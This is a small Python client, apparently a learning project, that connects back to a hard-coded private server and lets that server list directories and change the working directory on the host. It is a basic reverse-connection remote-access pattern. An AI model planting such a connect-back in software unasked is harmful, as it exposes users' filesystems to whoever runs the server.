from tools import *
import socket
import os

server_addr = "172.24.127.176"
server_port = 8899

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_addr, server_port))

pwd = os.getcwd()
data = {'pwd': pwd}
send_data(client, data)

while True:
    data = recv_data(client)
    if data["cmd"] == "ls":
        files = os.listdir()
        types = []
        for file in files:
            if os.path.isfile(file):
                types.append(1)
            else:
                types.append(0)
        res = {"files": files, "types": types}
        send_data(client, res)
    if data["cmd"] == "exit":
        client.close()
    if data["cmd"] == "cd":
        os.chdir(data["path"])
        send_data(client, {"pwd": os.getcwd()})
    